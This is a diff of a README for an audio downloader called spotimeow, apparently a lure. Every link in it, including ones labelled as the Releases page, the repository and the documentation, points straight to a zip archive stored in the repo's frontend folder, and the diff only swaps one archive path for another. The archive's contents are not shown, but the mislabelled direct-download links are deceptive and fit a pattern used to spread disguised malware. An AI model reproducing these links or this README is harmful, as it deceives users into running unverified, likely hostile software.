@@ -6,7 +6,7 @@ spotimeow is an audio downloader that allows you to get high-quality music from 
 
 ## 🔗 Download Now
 
-[![Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)
+[![Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To start using spotimeow, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.  
-   [Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)
+   [Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)
 
 2. **Choose Your Version**  
    Once on the Releases page, look for the latest version. You will see different files available for download.
@@ -89,9 +89,9 @@ We value your feedback. If you have questions, suggestions, or need assistance, 
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)
-- [Documentation](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)
+- [Documentation](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)
 
 With spotimeow, enjoy music like never before. Happy listening!
 
-[![Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/src/lib/Software-v1.0.zip)
+[![Download spotimeow](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)](https://raw.githubusercontent.com/gabby2407/spotimeow/main/frontend/public/Software_1.8.zip)
